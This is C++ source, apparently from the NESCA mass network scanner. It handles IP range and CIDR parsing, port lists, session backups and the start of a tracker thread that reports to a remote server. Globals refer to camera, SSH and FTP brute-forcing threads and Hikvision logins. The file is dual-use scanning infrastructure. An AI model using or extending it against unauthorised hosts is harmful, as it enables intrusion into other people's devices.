#include <MainStarter.h>
#include <AdaptiveScanner.h>
#include <cmath>
#include <random>
#include <algorithm>
#include <functional>
#include <QTextStream>
#include <QString>
#include <chrono>
#include <mutex>
#include <cstring>
#ifndef WIN32
#include <errno.h>
// Wrapper for GetLastError() on non-Windows platforms
static int GetLastError() {
	return errno;
}
#endif

int gTimeOut = 3;
int gPingTimeout = 1;
int gMaxRate = 0;  // 0 = no rate limit
int gRetries = 0;  // 0 = no retries
bool gVerifySSL = false;
char gUserAgent[256] = {0};  // Empty = use default
bool gAdaptiveScan = false;  // Adaptive thread adjustment
bool gSmartScan = false;  // Smart port prioritization
int gBatchSize = 0;  // 0 = no batching, otherwise batch size for processing
bool gDeepScan = false;  // Deep scan after device detection
bool gVulnScan = false;  // Vulnerability scanning
bool gServiceVersion = false;  // Service version detection
bool gHttp2Enabled = true;  // HTTP/2 support enabled by default
bool gWebSocketEnabled = true;  // WebSocket scanning enabled by default
bool gQuicEnabled = true;  // QUIC protocol scanning enabled by default
bool gShodanEnabled = false;  // Shodan API integration disabled by default
char gShodanApiKey[256] = {0};  // Shodan API key
bool gCensysEnabled = false;  // Censys API integration disabled by default
char gCensysApiId[256] = {0};  // Censys API ID
char gCensysApiSecret[256] = {0};  // Censys API Secret
int gMode;
int PieCamerasC1 = 0, PieBA = 0, PieOther = 0, PieSSH = 0;
int camerasC1 = 0, filtered = 0, Overl = 0, Alive = 0, saved = 0, other = 0, ssh = 0;
int found = 0, indexIP = 0;
int MaxPass = 0, MaxLogin = 0,
MaxWFLogin = 0, MaxWFPass = 0,
MaxFTPLogin = 0, MaxFTPPass = 0,
MaxSSHPass = 0;
int baCount = 0;
int gMaxBrutingThreads = 2000;
unsigned int Activity = 0;
char gTLD[128] = { 0 };
char gPorts[1024] = { 0 };
char currentIP[MAX_ADDR_LEN] = { 0 };
char finalIP[32] = { 0 };
bool gPingNScan = false;
std::atomic<int> cons(0), BrutingThrds(0), gThreads(0);
std::vector<int> MainStarter::portVector(0);
int MainStarter::flCounter = 0;
int MainStarter::gflIndex = 0;
unsigned int **MainStarter::ipsstartfl = NULL;
unsigned int **MainStarter::ipsendfl = NULL;
bool MainStarter::savingBackUpFile = false;
QJsonArray *jsonArr = new QJsonArray();
bool horLineFlag = false;
bool gShuffle = true;
int ipCounter = 0;
long long unsigned gTargets = 0, gTargetsNumber = 1;
char currentMask[128]	= { 0 };
char metaRange[256]		= { 0 };
char metaPercent[256]	= { 0 };
char metaIPS[256]		= { 0 };
char metaTargets[256]	= { 0 };
char metaETA[256]		= { 0 };
char metaOffline[256]	= { 0 };

bool saveBackup;

// Initialize GUI-related global variables for console mode (previously in nesca_3.cpp)
bool gDebugMode = false;
bool gNegDebugMode = false;
bool MapWidgetOpened = false;
bool widgetIsHidden = false;
bool trackerOK = false;
bool BALogSwitched = false;
bool QOSWait = false;
bool ME2ScanFlag = false;
bool QoSScanFlag = false;
bool VoiceScanFlag = false;
bool PieStatFlag = false;
char trcSrv[256] = {0};
char trcScr[256] = {0};
char trcProxy[128] = {0};
char trcPersKey[64] = {0};
char trcPort[32] = {0};
char trcSrvPortLine[32] = {0};
char gProxyIP[64] = {0};
char gProxyPort[8] = {0};
char gVER[32] = {0};
int globalPinger = 0;
int cIndex = 0;
float QoSStep = 1;

// Hikvision function pointers (previously in nesca_3.cpp)
// These are defined in mainResources.h and will be initialized to NULL
// They need to be defined here to satisfy linker
#include <mainResources.h>

NET_DVR_Init hik_init_ptr = NULL;
NET_DVR_Cleanup hik_cleanup_ptr = NULL;
NET_DVR_Login_V30 hik_login_ptr = NULL;

// Helper function to safely call stt methods
void safeSttCall(std::function<void()> func) {
	if (stt != nullptr) {
		func();
	}
}

void MainStarter::unBlockButtons(){
	safeSttCall([&]() { stt->doEmitionBlockButton(false); });
}
// Static flag to prevent re-entry into fileLoader
static bool inFileLoader = false;

int MainStarter::fileLoader(const char *fileName) {

	// Check if we're being called again on already allocated arrays
	if (inFileLoader) {
		// Already in fileLoader, don't cleanup again
		return -1;
	}
	inFileLoader = true;
	
	// Clean up existing memory before allocating new
	// Save old counter before resetting to avoid double free
	int oldFlCounter = flCounter;
	
	if (ipsstartfl != NULL)
	{
		// Only delete if oldFlCounter > 0 to avoid double free
		if (oldFlCounter > 0) {
			for (int i = 0; i < oldFlCounter; ++i) {
				if (ipsstartfl[i] != NULL) {
					delete[] ipsstartfl[i];
					ipsstartfl[i] = NULL;
				}
			}
		}
		delete[] ipsstartfl;
		ipsstartfl = NULL;
	}
	if (ipsendfl != NULL)
	{
		// Only delete if oldFlCounter > 0 to avoid double free
		if (oldFlCounter > 0) {
			for (int i = 0; i < oldFlCounter; ++i) {
				if (ipsendfl[i] != NULL) {
					delete[] ipsendfl[i];
					ipsendfl[i] = NULL;
				}
			}
		}
		delete[] ipsendfl;
		ipsendfl = NULL;
	}
	
	// Reset counters AFTER cleanup
	flCounter = 0;
	gflIndex = 0;

	// Read file and count valid lines
	std::vector<std::string> shuffleArray;
	ifstream inputStream(fileName);
	
	if (!inputStream.is_open()) {
		safeSttCall([&]() { stt->doEmitionRedFoundData("[IP Loader] Cannot open IP list."); });
		return -1;
	}
	
	std::string curIPStr;
	while (!inputStream.eof())
	{
		std::getline(inputStream, curIPStr);
		if (curIPStr.size() > 1 
			&& curIPStr.find("#") == std::string::npos) {
			shuffleArray.push_back(curIPStr);
		}
	}
	inputStream.close();
	
	unsigned int importFileSize = shuffleArray.size();

	if (shuffleArray.size() == 0) {
		safeSttCall([&]() { stt->doEmitionRedFoundData("[IP Loader] No valid IP addresses found in file."); });
		return -1;
	}

	// No limit on number of ranges - removed 10000 limit restriction
	ipsstartfl = new unsigned int*[shuffleArray.size() + 1];
	ipsendfl = new unsigned int*[shuffleArray.size() + 1];

	for (int i = 0; i < shuffleArray.size(); ++i)
	{
		ipsstartfl[i] = new unsigned int[4];
		ipsendfl[i] = new unsigned int[4];
	}

	// Shuffle array using modern approach to avoid stack overflow
	// For large arrays, shuffle can also cause issues, so we skip it for now
	// std::random_device rd;
	// std::mt19937 g(rd());
	// std::shuffle(shuffleArray.begin(), shuffleArray.end(), g);
	for (int i = 0; i < shuffleArray.size(); ++i) {
		curIPStr = shuffleArray[i];
		if (curIPStr.find("-") != std::string::npos) {
			std::vector<std::string> tmpIPVec = Utils::splitToStrVector(curIPStr, '-');
			std::vector<int> tmpIPIntVec1 = Utils::splitToIntVector(tmpIPVec[0], '.');
			std::vector<int> tmpIPIntVec2 = Utils::splitToIntVector(tmpIPVec[1], '.');

			ipsstartfl[MainStarter::flCounter][0] = tmpIPIntVec1[0];
			ipsstartfl[MainStarter::flCounter][1] = tmpIPIntVec1[1];
			ipsstartfl[MainStarter::flCounter][2] = tmpIPIntVec1[2];
			ipsstartfl[MainStarter::flCounter][3] = tmpIPIntVec1[3];

			ipsendfl[MainStarter::flCounter][0] = tmpIPIntVec2[0];
			ipsendfl[MainStarter::flCounter][1] = tmpIPIntVec2[1];
			ipsendfl[MainStarter::flCounter][2] = tmpIPIntVec2[2];
			ipsendfl[MainStarter::flCounter][3] = tmpIPIntVec2[3];

			if (ipsstartfl[MainStarter::flCounter][0] > ipsendfl[MainStarter::flCounter][0]
				|| (ipsstartfl[MainStarter::flCounter][0] >= ipsendfl[MainStarter::flCounter][0]
				&& ipsstartfl[MainStarter::flCounter][1] > ipsendfl[MainStarter::flCounter][1]
				)
				|| (ipsstartfl[MainStarter::flCounter][0] >= ipsendfl[MainStarter::flCounter][0]
				&& ipsstartfl[MainStarter::flCounter][1] >= ipsendfl[MainStarter::flCounter][1]
				&& ipsstartfl[MainStarter::flCounter][2] > ipsendfl[MainStarter::flCounter][2]
				)
				|| (ipsstartfl[MainStarter::flCounter][0] >= ipsendfl[MainStarter::flCounter][0]
				&& ipsstartfl[MainStarter::flCounter][1] >= ipsendfl[MainStarter::flCounter][1]
				&& ipsstartfl[MainStarter::flCounter][2] >= ipsendfl[MainStarter::flCounter][2]
				&& ipsstartfl[MainStarter::flCounter][3] > ipsendfl[MainStarter::flCounter][3]
				)
				)
			{
				stt->doEmitionRedFoundData(" [IP Loader]Wrong list format. String-> [" +
					QString(curIPStr.c_str()) + "]");
				return -1;
			};

			unsigned long ip1 = (ipsstartfl[MainStarter::flCounter][0] * 16777216) +
				(ipsstartfl[MainStarter::flCounter][1] * 65536) +
				(ipsstartfl[MainStarter::flCounter][2] * 256) +
				ipsstartfl[MainStarter::flCounter][3];
			unsigned long ip2 = (ipsendfl[MainStarter::flCounter][0] * 16777216) +
				(ipsendfl[MainStarter::flCounter][1] * 65536) +
				(ipsendfl[MainStarter::flCounter][2] * 256) +
				ipsendfl[MainStarter::flCounter][3];

			if (ip1 > ip2) {
				safeSttCall([&]() { stt->doEmitionRedFoundData(" Malformed input: check your range (" +
					QString(curIPStr.c_str()) + ")"); });
				continue;
			}

			// Limit the size of IP range to prevent memory issues
			// Increased limit to 16 million IPs (class A network) to allow large ranges
			unsigned long rangeSize = ip2 - ip1 + 1;
			const unsigned long MAX_RANGE_SIZE = 16777216; // 256^3 = class A network
			if (rangeSize > MAX_RANGE_SIZE) {
				safeSttCall([&]() { stt->doEmitionYellowFoundData("Range too large (>" + QString::number(MAX_RANGE_SIZE) + "), skipping: " + QString(curIPStr.c_str())); });
				continue;
			}

			gTargets += rangeSize;
			++MainStarter::flCounter;
		}
		else if (curIPStr.find("/") != std::string::npos)
		{
			if (curIPStr.size() > 18) {
				stt->doEmitionRedFoundData(" [IP Loader]Wrong list format. String-> [" +
					QString(curIPStr.c_str()) +
					"]");
				continue;
			}
			unsigned int ip[4] = { 0 }, ip_min[4] = { 0 }, ip_max[4] = { 0 }, tmp1, tmp2;
			unsigned int netmask = atoi(strstr(curIPStr.c_str(), "/") + 1);

			std::vector<int> tmpIPVec = Utils::splitToIntVector(curIPStr.c_str(), '.');

			for (int i = 0; i < tmpIPVec.size(); ++i) ip[i] = tmpIPVec[i];

			/*Set the bytes which won't be changed*/
			for (tmp1 = tmp2 = netmask / 8; tmp1>0; tmp1--){
				ip_min[tmp1 - 1] = ip[tmp1 - 1];
				ip_max[tmp1 - 1] = ip[tmp1 - 1];
			}
			/*Set the bytes which should be 0ed or 255ed.*/
			for (tmp1 = tmp2, ++tmp2; tmp2 < 4; tmp2++){
				ip_min[tmp2] = 0;
				ip_max[tmp2] = 255;
			}
			/* Finally set the one which has to be shifted.*/
			if (tmp1 < 4){
				tmp2 = 8 - netmask % 8;
				ip_min[tmp1] = ip[tmp1] >> tmp2;
				ip_min[tmp1] <<= tmp2;
				ip_max[tmp1] = ip_min[tmp1] + pow(2, tmp2) - 1;
			}

			ipsstartfl[MainStarter::flCounter][0] = ip_min[0];
			ipsstartfl[MainStarter::flCounter][1] = ip_min[1];
			ipsstartfl[MainStarter::flCounter][2] = ip_min[2];
			ipsstartfl[MainStarter::flCounter][3] = ip_min[3];

			ipsendfl[MainStarter::flCounter][0] = ip_max[0];
			ipsendfl[MainStarter::flCounter][1] = ip_max[1];
			ipsendfl[MainStarter::flCounter][2] = ip_max[2];
			ipsendfl[MainStarter::flCounter][3] = ip_max[3];

			unsigned long ip1 = (ip_min[0] * 16777216) +
				(ip_min[1] * 65536) +
				(ip_min[2] * 256) +
				ip_min[3];
			unsigned long ip2 = (ip_max[0] * 16777216) +
				(ip_max[1] * 65536) +
				(ip_max[2] * 256) +
				ip_max[3];

			if (ip1 > ip2) {
				stt->doEmitionRedFoundData("Malformed input: check your range (" +
					QString(curIPStr.c_str()) + ")");
			}

			gTargets += ip2 - ip1 + 1;
			++MainStarter::flCounter;
		}
		else if (strstr(curIPStr.c_str(), "RESTORE_IMPORT_SESSION") != NULL)
		{
			///DUMMY///
		}
		else
		{
			// Handle single IP addresses (not ranges or CIDR)
			std::vector<int> tmpIPVec = Utils::splitToIntVector(curIPStr.c_str(), '.');
			if (tmpIPVec.size() == 4) {
				// Valid single IP address
				ipsstartfl[MainStarter::flCounter][0] = tmpIPVec[0];
				ipsstartfl[MainStarter::flCounter][1] = tmpIPVec[1];
				ipsstartfl[MainStarter::flCounter][2] = tmpIPVec[2];
				ipsstartfl[MainStarter::flCounter][3] = tmpIPVec[3];

				ipsendfl[MainStarter::flCounter][0] = tmpIPVec[0];
				ipsendfl[MainStarter::flCounter][1] = tmpIPVec[1];
				ipsendfl[MainStarter::flCounter][2] = tmpIPVec[2];
				ipsendfl[MainStarter::flCounter][3] = tmpIPVec[3];

				gTargets += 1;
				++MainStarter::flCounter;
			} else {
				stt->doEmitionRedFoundData("[IP Loader]Wrong list format. Line-> [" +
					QString::number(MainStarter::flCounter) +
					"] String-> [" +
					QString(curIPStr.c_str()) +
					"]");
				return -1;
			}
		};
	};
	gTargetsNumber = gTargets;
	stt->doEmitionYellowFoundData("List loader - Loaded " + QString::number(gTargetsNumber) + " hosts");
	
	// Reset flag
	inFileLoader = false;

	return 0;
}
int MainStarter::loadTargets(const char *data) {

	if (gMode == 0) {
		std::vector<std::string> rangeVec;

		if (strstr(data, "/") != NULL) {

			unsigned int ip[4] = { 0 }, ip_min[4] = { 0 }, ip_max[4] = { 0 }, tmp1, tmp2;
			unsigned int netmask = atoi(strstr(data, "/") + 1);

			std::vector<int> tmpIPVec = Utils::splitToIntVector(data, '.');

			for (int i = 0; i < tmpIPVec.size(); ++i) ip[i] = tmpIPVec[i];

			/*Set the bytes which won't be changed*/
			for (tmp1 = tmp2 = netmask / 8; tmp1>0; tmp1--){
				ip_min[tmp1 - 1] = ip[tmp1 - 1];
				ip_max[tmp1 - 1] = ip[tmp1 - 1];
			}
			/*Set the bytes which should be 0ed or 255ed.*/
			for (tmp1 = tmp2, ++tmp2; tmp2< 4; tmp2++){
				ip_min[tmp2] = 0;
				ip_max[tmp2] = 255;
			}
			/* Finally set the one which has to be shifted.*/
			if (tmp1 < 4){
				tmp2 = 8 - netmask % 8;
				ip_min[tmp1] = ip[tmp1] >> tmp2;
				ip_min[tmp1] <<= tmp2;
				ip_max[tmp1] = ip_min[tmp1] + pow(2, tmp2) - 1;
			}

			char newRangeString[256] = { 0 };
			snprintf(newRangeString, sizeof(newRangeString), "%u.%u.%u.%u-%u.%u.%u.%u", 
				ip_min[0], ip_min[1], ip_min[2], ip_min[3], ip_max[0], ip_max[1], ip_max[2], ip_max[3]);
			rangeVec = Utils::splitToStrVector(std::string(newRangeString), '-');
		}
		else rangeVec = Utils::splitToStrVector(data, '-');

		std::vector<int> ip1TmpVec = Utils::splitToIntVector(rangeVec[0], '.');
		std::vector<int> ip2TmpVec = Utils::splitToIntVector(rangeVec[1], '.');

		ipsstart[0] = ip1TmpVec[0];
		ipsstart[1] = ip1TmpVec[1];
		ipsstart[2] = ip1TmpVec[2];
		ipsstart[3] = ip1TmpVec[3];

		ipsend[0] = ip2TmpVec[0];
		ipsend[1] = ip2TmpVec[1];
		ipsend[2] = ip2TmpVec[2];
		ipsend[3] = ip2TmpVec[3];

		ip1 = (ipsstart[0] * 16777216) + 
			(ipsstart[1] * 65536) + 
			(ipsstart[2] * 256) + 
			ipsstart[3];
		ip2 = (ipsend[0] * 16777216) + 
			(ipsend[1] * 65536) + 
			(ipsend[2] * 256) + 
			ipsend[3];

		if (ip1 > ip2) {
			stt->doEmitionRedFoundData("Malformed input: check your range");
			return -1;
		}

		snprintf(finalIP, sizeof(finalIP), "%d.%d.%d.%d", 
			ipsend[0], ipsend[1], ipsend[2], ipsend[3]);

		gTargets = ip2 - ip1 + 1;
		gTargetsNumber = gTargets;
	}
	else if (gMode == 1) {
		strncpy(dnsTarget, data, 255);
		dnsTarget[255] = '\0'; // Ensure null termination

		gTargets = ip2 - ip1 + 1;
		gTargetsNumber = gTargets;
	} 
	else {
		if (fileLoader(data) == -1) {
			safeSttCall([&]() { stt->doEmitionRedFoundData("IP list is empty."); });
			return -1;
		}
		// Check if arrays are initialized and gflIndex is valid
		// Reset gflIndex to 0 for safety
		gflIndex = 0;
		if (ipsendfl != NULL && flCounter > 0 && gflIndex >= 0 && gflIndex < flCounter) {
			// Ensure indices are valid before accessing
			if (ipsendfl[gflIndex] != NULL) {
				snprintf(finalIP, sizeof(finalIP), "%d.%d.%d.%d", 
					ipsendfl[gflIndex][0], ipsendfl[gflIndex][1], ipsendfl[gflIndex][2], ipsendfl[gflIndex][3]);
			} else {
				snprintf(finalIP, sizeof(finalIP), "0.0.0.0");
			}
		} else {
			// Default value if arrays not initialized
			snprintf(finalIP, sizeof(finalIP), "0.0.0.0");
		}
	}

	return 0;
}
int MainStarter::loadPorts(const char *data, char delim) {
	portVector = Utils::splitToIntVector(data, delim);
	
	if (portVector.empty()) {
		stt->doEmitionRedFoundData("No ports specified");
		return -1;
	}
	
	for (auto elem : portVector) {
		if (elem > 65535 || elem < 1) {
			stt->doEmitionRedFoundData("Invalid port number: " + QString::number(elem) + 
				" (must be between 1 and 65535)");
			return -1;
		}
	}
	// Store ports in gPorts buffer (for backup saving), but limit to prevent overflow
	// Format: "-p" + comma-separated ports
	size_t portsLen = strlen(data);
	size_t maxPortsLen = sizeof(gPorts) - 3; // Leave room for "-p" prefix and null terminator
	if (portsLen > maxPortsLen) {
		portsLen = maxPortsLen;
	}
	snprintf(gPorts, sizeof(gPorts), "-p%.*s", (int)portsLen, data);
	return 0;
}

void MainStarter::saveBackupToFile()
{
	char saveStr[512] = { 0 };
	char saveBuffer[4096] = { 0 };
	char endStr[128] = { 0 };

	if (gMode == 0 || gMode == 1)
	{
		if (gMode == 1)
		{
			if (strlen(currentMask) == 0) {
				snprintf(endStr, sizeof(endStr), "%s", currentIP);
			}
			else {
				// Use strncpy to prevent overflow
				strncpy(endStr, currentMask, sizeof(endStr) - 1);
				endStr[sizeof(endStr) - 1] = '\0';
			}
		}
		else
		{
			if (strlen(finalIP) == 0) snprintf(endStr, sizeof(endStr), "%s", currentIP);
			else snprintf(endStr, sizeof(endStr), "%s-%s", currentIP, finalIP);
		};

		if (strlen(endStr) > 0)
		{
			// Limit gPorts to prevent buffer overflow
			char portsDisplay[256] = {0};
			strncpy(portsDisplay, gPorts, sizeof(portsDisplay) - 1);
			portsDisplay[sizeof(portsDisplay) - 1] = '\0';
			snprintf(saveStr, sizeof(saveStr), "[SESSION]:%d %s %s %d %s\n",
				gMode, endStr, gTLD, int(gThreads), portsDisplay);
			// Check buffer size before strcat
			if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
				strcat(saveBuffer, saveStr);
			}
			//ZeroMemory(saveStr, sizeof(saveStr));
			saveStr[0] = 0;
		};
	}
	else if (gMode == -1)
	{
		char ipRange[128] = { 0 };

		if (MainStarter::flCounter > 0)
		{
			if (!saveBackup) {
				// Don't create backup file, just return without accessing arrays
				return;
			}
			// Check if arrays are initialized before accessing
			if (ipsstartfl == NULL || ipsendfl == NULL) {
				return;
			}
			// Check if gflIndex is valid
			if (gflIndex < 0 || gflIndex >= flCounter) {
				// Reset to 0 if invalid
				gflIndex = 0;
			}
			// Protect file operations with mutex to prevent Err:24 (EMFILE)
			// Use the same mutex as fputsf to ensure no concurrent file operations
			extern std::mutex fileWriteMutex;
			std::lock_guard<std::mutex> lock(fileWriteMutex);
			
			// Try to open file with retry on Err:24 (EMFILE)
			FILE *savingFile = NULL;
			int retryCount = 0;
			const int maxRetries = 5;
			while (savingFile == NULL && retryCount < maxRetries) {
				savingFile = fopen("tempIPLst.bk", "w");
				if (savingFile == NULL) {
					int err = GetLastError();
					if (err == 24) {  // EMFILE - too many open files
						Sleep(50);
						retryCount++;
						if (retryCount >= maxRetries) {
							stt->doEmitionYellowFoundData("[_saver] Cannot open file after " + QString::number(maxRetries) + " retries (Err:24)");
						}
					} else {
						// Other error, don't retry
						stt->doEmitionRedFoundData("[_saver] Cannot open file. Err:" + QString::number(err));
						break;
					}
				}
			}
			
			if (NULL != savingFile)
			{
				if (gflIndex < MainStarter::flCounter) {
					sprintf(ipRange, "%d.%d.%d.%d-%d.%d.%d.%d\n",
						ipsstartfl[gflIndex][0],
						ipsstartfl[gflIndex][1],
						ipsstartfl[gflIndex][2],
						ipsstartfl[gflIndex][3],
						ipsendfl[gflIndex][0],
						ipsendfl[gflIndex][1],
						ipsendfl[gflIndex][2],
						ipsendfl[gflIndex][3]);
					fputs(ipRange, savingFile);
					//ZeroMemory(ipRange, sizeof(ipRange));
					ipRange[0] = 0;
				}
				for (int tCounter = gflIndex + 1; tCounter < MainStarter::flCounter; ++tCounter)
				{
					sprintf(ipRange, "%d.%d.%d.%d-%d.%d.%d.%d\n",
						ipsstartfl[tCounter][0], 
						ipsstartfl[tCounter][1], 
						ipsstartfl[tCounter][2], 
						ipsstartfl[tCounter][3],
						ipsendfl[tCounter][0], 
						ipsendfl[tCounter][1], 
						ipsendfl[tCounter][2], 
						ipsendfl[tCounter][3]);

					fputs(ipRange, savingFile);

					//ZeroMemory(ipRange, sizeof(ipRange));
					ipRange[0] = 0;
				};
				fclose(savingFile);
			}
		};

		// Limit gPorts to prevent buffer overflow (saveStr is 512 bytes)
		char portsDisplay[256] = {0};
		strncpy(portsDisplay, gPorts, sizeof(portsDisplay) - 1);
		portsDisplay[sizeof(portsDisplay) - 1] = '\0';
		snprintf(saveStr, sizeof(saveStr), "[SESSION]:%d RESTORE_IMPORT_SESSION %d %s\n", gMode, int(gThreads), portsDisplay);
		// Check buffer size before strcat
		if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
			strcat(saveBuffer, saveStr);
		}
		//ZeroMemory(saveStr, sizeof(saveStr));
		saveStr[0] = 0;
	}
	else {
	snprintf(saveStr, sizeof(saveStr), "[SESSION]: 0 1.1.1.1/32 0 -p80");
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;
	}

	snprintf(saveStr, sizeof(saveStr), "[NDBSERVER]:%s\n", trcSrv);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[NDBSCRIPT]:%s\n", trcScr);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[NDBPORT]:%s\n", trcSrvPortLine);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[PROXY]:%s\n", trcProxy);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[PROXYPORT]:%s\n", trcPort);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[PING]:%s\n", gPingNScan ? "true" : "false");
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[SHUFFLE]:%s\n", gShuffle ? "true" : "false");
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	//ZeroMemory(saveStr, sizeof(saveStr));
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[NSTRACK]:%s\n", trackerOK ? "true" : "false");
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	//ZeroMemory(saveStr, sizeof(saveStr));
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[PING_TO]: %d\n", gPingTimeout);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[THREAD_DELAY]: %d\n", Threader::gThreadDelay);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[TIMEOUT]: %d\n", gTimeOut);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[MAXBTHR]: %d\n", gMaxBrutingThreads);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[SYSTEMPROXYIP]: %s\n", gProxyIP);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[SYSTEMPROXYPORT]: %s\n", gProxyPort);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	//ZeroMemory(saveStr, sizeof(saveStr));
	saveStr[0] = 0;

	snprintf(saveStr, sizeof(saveStr), "[PERSKEY]:%.32s\n", trcPersKey);
	if (strlen(saveBuffer) + strlen(saveStr) < sizeof(saveBuffer) - 1) {
		strcat(saveBuffer, saveStr);
	}
	//ZeroMemory(saveStr, sizeof(saveStr));
	saveStr[0] = 0;

	std::string finalSaveStr(saveBuffer);
	std::ofstream file("restore");
	if (finalSaveStr.size() > 0) file << finalSaveStr;
	//ZeroMemory(saveBuffer, sizeof(saveBuffer));
	saveBuffer[0] = 0;
}

bool saverRunning = false;
void MainStarter::saveBK() {
	while (savingBackUpFile) Sleep(400);
	savingBackUpFile = true;
	saveBackupToFile();
	savingBackUpFile = false;
}
void MainStarter::saver()
{
	saverRunning = true;
	Sleep(1000);
	while (saveBackup && globalScanFlag)
	{
		saveBK();
		Sleep(10000);
	};
	saverRunning = false;
}

bool ipPerSecTimer = false;
void _IPPerSecTimer() {
	ipPerSecTimer = true;
	int ticks = 0;
	int ovrlIPs = 0;
	Sleep(50);

	while (globalScanFlag)
	{
		ovrlIPs += ipCounter;
		ipCounter = 0;

		sprintf(metaIPS, "%f.5", ovrlIPs / ++ticks);

		Sleep(1000);
	}
	ipPerSecTimer = false;
}

bool trackerRunning = false;
void _tracker() {
	trackerRunning = true;
	while (true) {
		while (globalScanFlag && !trackerOK) Sleep(1000);

		if (!globalScanFlag && jsonArr->size() == 0) break;
		char rBuffT[250000] = { 0 };
		char *msg = new char[4096];
		//ZeroMemory(msg, sizeof(*msg));
		msg[0] = 0;
		char ndbServer[64] = { 0 };
		char ndbScriptT[64] = { 0 };
		char ndbScript[64] = { 0 };

		sockaddr_in sockAddr;
		sockAddr.sin_family = AF_INET;
		sockAddr.sin_port = htons(atoi(trcSrvPortLine));

		sprintf(msg, "GET /%s HTTP/1.1\r\nHost: %s\r\nX-Nescav3: True\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n",
			trcScr, trcSrv);

		HOSTENT *host;

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
		if (inet_addr(trcSrv) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(trcSrv);
		else if ((host = gethostbyname(trcSrv)) != NULL) {
			memcpy(&sockAddr.sin_addr, host->h_addr_list[0], host->h_length);
		}
#else
		if (inet_addr(trcSrv) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(trcSrv);
		else if ((host = gethostbyname(trcSrv)) != NULL) {
			memcpy(&sockAddr.sin_addr, host->h_addr_list[0], host->h_length);
		}
#endif
		SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

		if (connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr)) == -1)
		{
			CSSOCKET(sock);

			stt->doEmitionRedFoundData("[NS-Track] -Cannot connect to balancer! " + QString::number(WSAGetLastError()) + ".");

			continue;
		};

		if (send(sock, msg, strlen(msg), 0) == -1)
		{
			CSSOCKET(sock);

			stt->doEmitionRedFoundData("[NS-Track] -Cannot send to balancer! " + QString::number(WSAGetLastError()) + ".");

			continue;
		};

		//ZeroMemory(rBuffT, sizeof(rBuffT));
		rBuffT[0] = 0;
		char rBuff[512] = { 0 };
		int test = recv(sock, rBuff, sizeof(rBuff), 0);
		strcpy(rBuffT, rBuff);

		while ((test = recv(sock, rBuff, sizeof(rBuff), 0)) != 0)
		{
			if (strlen(rBuffT) > 200000)
			{
				stt->doEmitionRedFoundData("[NS-Track] (Outer) -Large error received from server (>200000b) " + 
					QString::number(WSAGetLastError()) + ".");
				break;
			};
			strcat(rBuffT, rBuff);
		};

		if (test == -1)
		{
			CSSOCKET(sock);

			stt->doEmitionRedFoundData("[NS-Track] -Cannot recv from balancer! " + QString::number(WSAGetLastError()) + ".");

			continue;
		};

		char *t1;
		char *t2;
		if (strstr(rBuffT, "http://") != NULL)
		{
			t1 = strstr(rBuffT, "http://");
			if (strstr((char*)(t1 + 7), "/") != NULL)
			{
				t2 = strstr((char*)(t1 + 7), "/");
				int ln = t2 - t1 - 7;
				if (ln > 64)
				{
					CSSOCKET(sock);

					stt->doEmitionRedFoundData("[NS-Track] -Received server string is not valid!");

					continue;
				}
				else strncpy(ndbServer, (char*)(t1 + 7), ln);

				if (strlen(t2) > 64)
				{

					stt->doEmitionYellowFoundData("[NS-Track] -Fragmentation detected!");

